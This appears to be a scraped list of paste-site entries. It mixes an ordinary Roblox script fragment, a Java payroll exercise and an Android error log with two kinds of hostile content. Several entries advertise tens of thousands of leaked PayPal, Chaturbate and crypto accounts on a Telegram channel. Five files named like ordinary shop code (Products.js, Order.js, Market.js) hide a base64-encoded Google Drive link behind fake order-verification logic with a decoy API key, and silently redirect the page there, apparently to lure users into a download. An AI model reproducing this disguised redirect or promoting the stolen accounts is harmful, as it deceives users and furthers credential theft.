			table.insert(zombieSpawnParts, part)
		end
	end
	spawnedZombies = {}
	activeZombies = {}
	for _, zombieSpawnPart in zombieSpawnParts do
		self:SpawnZombieAt(zombieSpawnPart)
	end
end

return ZombieAI"
x2SSA6XT,PayPal with Balance,jm33,JavaScript,Sunday 27th of April 2025 08:20:04 AM CDT,11470 Accounts Posted On https://t.me/leakedbyem1nem
rGNVws4S,Untitled,SpawnKz,JavaScript,Sunday 27th of April 2025 08:09:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04174/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7MM7FQLL,PayPal with Balance,SpawnKz,JavaScript,Sunday 27th of April 2025 08:04:14 AM CDT,43565 Accounts Posted On https://t.me/leakedbyem1nem
in8VnGjt,Untitled,WantingTrae,JavaScript,Sunday 27th of April 2025 07:54:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26867/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ErUcbmx2,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Sunday 27th of April 2025 07:48:51 AM CDT,42221 Accounts Posted On https://t.me/leakedbyem1nem
kCLCbqsi,Products.js,WantingTrae,JavaScript,Sunday 27th of April 2025 07:39:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24284/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
D2cNqPQL,Chaturbate with Tokens,SpawnKz,JavaScript,Sunday 27th of April 2025 07:33:29 AM CDT,48568 Accounts Posted On https://t.me/leakedbyem1nem
w0VTfV2j,Order.js,WantingTrae,JavaScript,Sunday 27th of April 2025 07:23:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84597/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mJKs8H4S,2025-04-27T15:22:04.726337,powerampache,PHP,Sunday 27th of April 2025 07:22:06 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to music.kosil.ru/178.234.29.93 (port 443) from /192.168.0.30 (port 56684) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to music.kosil.ru/178.234.29.93 (port 443) from /192.168.0.30 (port 56684) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to music.kosil.ru/178.234.29.93 (port 443) from /192.168.0.30 (port 56684) after 15000ms\"" }"",""stackTrace"":[]}"
3nNPKuqz,Crypto Accounts,SpawnKz,JavaScript,Sunday 27th of April 2025 07:18:06 AM CDT,84243 Accounts Posted On https://t.me/leakedbyem1nem
0Jf8dtEB,[NP] Payroll System v2,dzocesrce,Java,Sunday 27th of April 2025 07:16:42 AM CDT,"import java.io.*;
import java.util.*;
import java.util.stream.Collectors;
import java.util.Comparator;
import java.util.List;

class HourlyEmployee extends Employee{
    double hours;
    EMPLOYEE_TYPE employeeType;
    double hourlyRate;
    public static int WEEK_HOURS=40;
    public static double OVERTIME_RATE=1.5;
    int bonus;
    BONUS_TYPE bonusType;
    public HourlyEmployee(String id, String level, double hours,EMPLOYEE_TYPE employeeType, int bonus, BONUS_TYPE bonusType) {
        super(id,level);
        this.hours= hours;
        this.employeeType= employeeType;
        this.hourlyRate=0;
        this.bonus= bonus;
        this.bonusType= bonusType;
    }

    public void setRate(double hourlyRate){
        this.hourlyRate= hourlyRate;
    }
    public double getOvertimeSalary(){
        return Math.max(0,hours-WEEK_HOURS)*OVERTIME_RATE;
    }
    @Override
    public double getBonus() {
        if(bonusType.equals(BONUS_TYPE.FIXED))
            return bonus;
        else if(bonusType.equals(BONUS_TYPE.PROCENTUAL))
            return getSalary()*bonus/100.00;
        else
            return 0;
    }

    public EMPLOYEE_TYPE getEmployeeType() {
        return employeeType;
    }



    @Override
    public double getSalary() {
        return Math.min(WEEK_HOURS,hours)*hourlyRate+OVERTIME_RATE*Math.max(0,hours-WEEK_HOURS)*hourlyRate;
    }

    @Override
    public String toString() {
        return String.format(""Employee ID: %s Level: %s Salary: %.2f Regular hours: %.2f Overtime hours: %.2f  Bonus: %.2f"",
                id,
                level,
                getSalary(),
                Math.min(WEEK_HOURS,hours),
                Math.max(0,hours-WEEK_HOURS),
                getBonus());
    }

    @Override
    public int compareTo(Employee o) {
        return Comparator.comparing(Employee::getSalary).reversed().compare(this,o);
    }
}
class FreelanceEmployee extends Employee {
    List<Integer> tickets;
    EMPLOYEE_TYPE employeeType;
    double ratePerTicket;
    int bonus;
    BONUS_TYPE bonusType;
    public FreelanceEmployee(String id, String level, List<Integer> tickets, EMPLOYEE_TYPE employeeType, int bonus, BONUS_TYPE bonusType) {
        super(id, level);
        this.tickets = tickets;
        this.employeeType = employeeType;
        this.ratePerTicket=0;
        this.bonus= bonus;
        this.bonusType= bonusType;
    }

    public int getNumberOfTickets(){
        return tickets.size();
    }
    
    public int getTicketPoints() {
        return tickets.stream().mapToInt(i -> i).sum();
    }

    public void setRate(double ratePerTicket){
        this.ratePerTicket= ratePerTicket;
    }


    public EMPLOYEE_TYPE getEmployeeType() {
        return employeeType;
    }

    @Override
    public double getSalary() {
        return ratePerTicket*getTicketPoints();
    }

    @Override
    public double getBonus() {
        if(bonusType.equals(BONUS_TYPE.FIXED))
            return bonus;
        else if(bonusType.equals(BONUS_TYPE.PROCENTUAL))
            return getSalary()*bonus/100.00;
        else
            return 0;
    }

    @Override
    public String toString() {
        return String.format(""Employee ID: %s Level: %s Salary: %.2f Tickets count: %d Tickets points: %d  Bonus: %.2f"",
                id,
                level,
                getSalary(),
                tickets.size(),
                getTicketPoints(),
                getBonus());
    }

    @Override
    public int compareTo(Employee o) {
        return Comparator.comparing(Employee::getSalary).reversed().compare(this,o);
    }
}


enum BONUS_TYPE {

    FIXED,
    NONE, PROCENTUAL
}

class BonusNotAllowedException extends  Exception{

    public BonusNotAllowedException(String message) {
        super(message);
    }
}

abstract class Employee implements Comparable<Employee> {
    String id;
    String level;

    public Employee(String id, String level) {
        this.id = id;
        this.level = level;
    }

    public abstract void setRate(double rate);

    public String getId() {
        return id;
    }

    public String getLevel() {
        return level;
    }

    public abstract double getBonus();

    public abstract double getSalary();

    public abstract EMPLOYEE_TYPE getEmployeeType();

}
enum EMPLOYEE_TYPE {
    HOURLY,
    FREELANCE
}

class PayrollSystem {

    Map<String, List<Employee>> employees;
    Map<String, Double> hourlyRateByLevel;
    Map<String, Double> timeRateByLevel;

    PayrollSystem(Map<String, Double> hourlyRateByLevel, Map<String, Double> ticketRateByLevel) {
        this.hourlyRateByLevel = hourlyRateByLevel;
        this.timeRateByLevel = ticketRateByLevel;
        this.employees = new HashMap<>();
        this.employees.put(""F"", new ArrayList<>());
        this.employees.put(""H"", new ArrayList<>());
    }

    public Employee createEmployee(String line) throws BonusNotAllowedException {
        String[] partsAndBonus = line.split(""\\s+"");
        String bonus = """";
        if (partsAndBonus.length > 1) {
            bonus = partsAndBonus[1];
        }
        String[] parts = partsAndBonus[0].split("";"");
        String type = parts[0];
        String id = parts[1];
        String level = parts[2];
        double hourlySalary;
        List<Integer> tickets = new ArrayList<>();
        if (!bonus.equals("""")) {
            if (bonus.contains(""%"") && Double.parseDouble(bonus.substring(0, bonus.length()-1)) > 20)
                throw new BonusNotAllowedException(""E TOE"");
            if (!bonus.contains(""%"") && Double.parseDouble(bonus) > 1000)
                throw new BonusNotAllowedException(""E TOE"");
        }
        if (type.equals(""H"")) {
            hourlySalary = Double.parseDouble(parts[3]);
            if (bonus.equals("""")) {
                employees.get(""H"").add(new HourlyEmployee(id, level, hourlySalary, EMPLOYEE_TYPE.HOURLY, 0, BONUS_TYPE.NONE));
            } else {
                if (bonus.contains(""%"")) {
                    employees.get(""H"").add(new HourlyEmployee(id, level, hourlySalary, EMPLOYEE_TYPE.HOURLY,
                            Double.parseDouble(bonus.substring(0, bonus.length() - 1)), BONUS_TYPE.PROCENTUAL));
                } else {
                    employees.get(""H"").add(new HourlyEmployee(id, level, hourlySalary, EMPLOYEE_TYPE.HOURLY,
                            Double.parseDouble(bonus), BONUS_TYPE.FIXED));
                }
            }
            return employees.get(""H"").get(employees.size() - 1);
        } else {
            for (int i = 3; i < parts.length; i++) {
                tickets.add(Integer.parseInt(parts[i]));
            }
            if (bonus.equals("""")) {
                employees.get(""F"").add(new FreelanceEmployee(id, level, tickets, EMPLOYEE_TYPE.HOURLY, 0, BONUS_TYPE.NONE));
            } else {
                if (bonus.contains(""%"")) {
                    employees.get(""F"").add(new FreelanceEmployee(id, level, tickets, EMPLOYEE_TYPE.HOURLY,
                            Double.parseDouble(bonus.substring(0, bonus.length() - 1)), BONUS_TYPE.PROCENTUAL));

                } else {
                    employees.get(""F"").add(new FreelanceEmployee(id, level, tickets, EMPLOYEE_TYPE.HOURLY,
                            Double.parseDouble(bonus), BONUS_TYPE.FIXED));
                }
            }
            return employees.get(""F"").get(employees.size() - 1);

        }
    }


    public void setRates() {

        for (Employee e : employees.get(""H"")) {
            double hourlyRate = hourlyRateByLevel.get(e.getLevel());
            e.setRate(hourlyRate);
        }
        for (Employee e : employees.get(""F"")) {
            double ratePerTicket = timeRateByLevel.get(e.getLevel());
            e.setRate(ratePerTicket);
        }

    }

//    public Map<String, Set<Employee>> printEmployeesByLevels(PrintStream out, Set<String> levels) {
//        PrintWriter printWriter = new PrintWriter(out);
//        Map<String, Set<Employee>> employeesByLevels = employees.stream()
//                .filter(i -> levels.contains(i.getLevel()))
//                .collect(Collectors.groupingBy(
//                        Employee::getLevel,
//                        TreeMap::new, // map sorted by key
//                        Collectors.toCollection(TreeSet::new) // values sorted too
//                ));
//        printWriter.flush();
//        return employeesByLevels;
//    }


    Map<String, Double> getOvertimeSalaryForLevels() {
        return employees.get(""H"").stream()
                .map(e -> (HourlyEmployee) e)
                .collect(Collectors.groupingBy(
                Employee::getLevel,
                Collectors.summingDouble(HourlyEmployee::getOvertimeSalary)
        ));
    }

    void printStatisticsForOvertimeSalary() {
        DoubleSummaryStatistics doubleSummaryStatistics= employees.values().stream().flatMap(list -> list.stream()).mapToDouble(i->i.getBonus()).summaryStatistics();
        System.out.println(String.format(""Min: %.2f Max: %.2f Sum: %.2f Average: %.2f"",doubleSummaryStatistics.getMin(),
                doubleSummaryStatistics.getMax(),
                doubleSummaryStatistics.getSum(),
                doubleSummaryStatistics.getAverage()));
    }

    Map<String, Integer> ticketsDoneByLevel() {
        return employees.get(""F"").stream()
        .map(e -> (FreelanceEmployee) e)
        .collect(Collectors.groupingBy(
                Employee::getLevel,
                Collectors.summingInt(FreelanceEmployee::getNumberOfTickets)
        ));

    }

    Collection<Employee> getFirstNEmployeesByBonus(int n) {
        return employees.values().stream().flatMap(list -> list.stream())
                .sorted(Comparator.comparing(Employee::getBonus).reversed())
                .limit(n).collect(Collectors.toList());
    }
}
public class PayrollSystemTest2 {

    public static void main(String[] args) {

        Map<String, Double> hourlyRateByLevel = new LinkedHashMap<>();
        Map<String, Double> ticketRateByLevel = new LinkedHashMap<>();
        for (int i = 1; i <= 10; i++) {
            hourlyRateByLevel.put(""level"" + i, 11 + i * 2.2);
            ticketRateByLevel.put(""level"" + i, 5.5 + i * 2.5);
        }

        Scanner sc = new Scanner(System.in);

        int employeesCount = Integer.parseInt(sc.nextLine());

        PayrollSystem ps = new PayrollSystem(hourlyRateByLevel, ticketRateByLevel);
        Employee emp = null;
        for (int i = 0; i < employeesCount; i++) {
            try {
                emp = ps.createEmployee(sc.nextLine());
            } catch (BonusNotAllowedException e) {
                System.out.println(e.getMessage());
            }
        }
        ps.setRates();
        int testCase = Integer.parseInt(sc.nextLine());

        switch (testCase) {
            case 1: //Testing createEmployee
                if (emp != null)
                    System.out.println(emp);
                break;
            case 2: //Testing getOvertimeSalaryForLevels()
                ps.getOvertimeSalaryForLevels().forEach((level, overtimeSalary) -> {
                    System.out.printf(""Level: %s Overtime salary: %.2f\n"", level, overtimeSalary);
                });
                break;
            case 3: //Testing printStatisticsForOvertimeSalary()
                ps.printStatisticsForOvertimeSalary();
                break;
            case 4: //Testing ticketsDoneByLevel
                ps.ticketsDoneByLevel().forEach((level, overtimeSalary) -> {
                    System.out.printf(""Level: %s Tickets by level: %d\n"", level, overtimeSalary);
              });
               break;
            case 5: //Testing getFirstNEmployeesByBonus (int n)
                ps.getFirstNEmployeesByBonus(Integer.parseInt(sc.nextLine())).forEach(System.out::println);
                break;
        }

    }
}"
0hFAf1FG,Market.js,WantingTrae,JavaScript,Sunday 27th of April 2025 07:08:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42453/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
